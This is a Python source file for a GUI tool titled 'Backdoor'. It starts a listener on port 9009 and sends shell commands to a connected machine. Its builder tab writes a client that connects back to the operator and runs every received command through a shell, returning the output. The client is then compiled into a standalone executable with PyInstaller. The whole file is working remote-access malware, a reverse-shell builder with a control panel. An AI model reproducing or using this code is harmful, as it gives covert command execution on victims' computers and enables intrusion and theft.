import customtkinter as ctk
import socket
import threading
from datetime import datetime
import time
import os
def start():
  startserver.configure(state="disabled")
  action.configure(text="starting backdoor...")
  n = 500
  iter_step = 1/n
  progress_step = iter_step
  progressbar.start()
  for x in range(500):
      progressbar.set(progress_step)
      progress_step += iter_step
      progressbar.update_idletasks()
  progressbar.stop()
  iter_step = 1/n
  progress_step = iter_step
  progressbar.set(progress_step)
  build.configure(state="enabled")
  endserver.configure(state="enabled")
  host = socket.gethostname()
  global ip
  ip = socket.gethostbyname(host)
  global s
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  s.bind((ip, 9009))
  action.configure(text="awaiting action...")
  now = datetime.now()
  currenttime = now.strftime("%H:%M:%S")
  serveroutput.insert("0.0", 'Backdoor started (%s)\n' % currenttime)
  s.listen(1)
  t = threading.Thread(target=accept)
  t.start()  
def accept():
  global c
  print('accepting')
  c, addr = s.accept()
  print('accepted')
  send.configure(state="enabled")
  now = datetime.now()
  currenttime = now.strftime("%H:%M:%S")
  serveroutput.insert("0.0", 'Client connected (%s)\n' % currenttime)
  send.configure(state="enabled")
  threading.Thread(target=recieve).start() 
def recieve():
  while True:
   recieved = s.recv(1024).decode()
   textbox.insert(recieved)   
def end():
  action.configure(text="stopping backdoor...")
  n = 500
  iter_step = 1/n
  progress_step = iter_step
  progressbar.start()
  for x in range(500):
      progressbar.set(progress_step)
      progress_step += iter_step
      progressbar.update_idletasks()
  progressbar.stop()
  iter_step = 1/n
  progress_step = iter_step
  progressbar.set(progress_step)
  build.configure(state="disabled")
  startserver.configure(state="enabled")
  endserver.configure(state="disabled")
  s.close()
  now = datetime.now()
  currenttime = now.strftime("%H:%M:%S")
  serveroutput.insert("0.0", 'Backdoor ended (%s)\n' % currenttime)
  action.configure(text="awaiting action...") 
def builder():
  action.configure(text="building file...")
  n = 500
  iter_step = 1/n
  progress_step = iter_step
  progressbar.start()
  for x in range(500):
      progressbar.set(progress_step)
      progress_step += iter_step
      progressbar.update_idletasks()
  progressbar.stop()
  iter_step = 1/n
  progress_step = iter_step
  progressbar.set(progress_step)
  name = filename.get()
  f = open(f"{name}.py", "x")
  f.write(""" 
import socket
import subprocess
REMOTE_HOST = '%s'
REMOTE_PORT = 9009
client = socket.socket()
client.connect((REMOTE_HOST, REMOTE_PORT))
while True:
  command = client.recv(1024)
  command = command.decode()
  op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
  output = op.stdout.read()
  output_error = op.stderr.read()
  client.send(output + output_error)
  """ % ip)
  f.close()
  nameinput = filename.get()
  os.system("python -m PyInstaller --onefile %s.py" % nameinput)
  now = datetime.now()
  currenttime = now.strftime("%H:%M:%S")
  fileoutput.insert("0.0", 'file "%s.exe" built (%s)\n' % (nameinput, currenttime))
  action.configure(text="awaiting action...")
def sendcommand():
  rawcommand = command.get()
  data = rawcommand.encode()
  c.send(data)
  output = c.recv(1024)
  output2 = output.decode()
  textbox.insert("0.0", output2) 
root = ctk.CTk()
root.title("Backdoor")
root.geometry("450x270")
ctk.set_appearance_mode("dark")
action = ctk.CTkLabel(root, text="awaiting action...")
action.place(x=180, y=0)
progressbar = ctk.CTkProgressBar(root, width=400)
n = 500
iter_step = 0/n
progress_step = iter_step
progressbar.set(progress_step)
progressbar.place(x=25, y=30)
tabview = ctk.CTkTabview(root, width=450, height=230)
tabview.place(x=0, y=40)
tabview.add("Commands")
tabview.add("Client")
tabview.add("Builder")
tabview.add("Backdoor")
command = ctk.CTkEntry(tabview.tab("Commands"), placeholder_text="command", width=375)
command.place(x=0, y=5)
send = ctk.CTkButton(tabview.tab("Commands"), text="Send", width=50, state="disabled", command=sendcommand)
send.place(x=385, y=5)
textbox = ctk.CTkTextbox(tabview.tab("Commands"), height=160, width=440)
textbox.place(x=0, y=45)
startserver = ctk.CTkButton(tabview.tab("Backdoor"), text="start backdoor", width=210, command=start)
startserver.place(x=5, y=5)
endserver = ctk.CTkButton(tabview.tab("Backdoor"), text="stop backdoor", width=210, command=end, state="disabled")
endserver.place(x=225, y=5)
serveroutput = ctk.CTkTextbox(tabview.tab("Backdoor"), height=160, width=440)
serveroutput.place(x=0, y=45)
filename = ctk.CTkEntry(tabview.tab("Builder"), placeholder_text="filename", width=375)
filename.place(x=0, y=5)
build = ctk.CTkButton(tabview.tab("Builder"), text="Build", command=builder, state="disabled", width=50)
build.place(x=385, y=5)
fileoutput = ctk.CTkTextbox(tabview.tab("Builder"), height=160, width=440)
fileoutput.place(x=0, y=45)
root.mainloop()
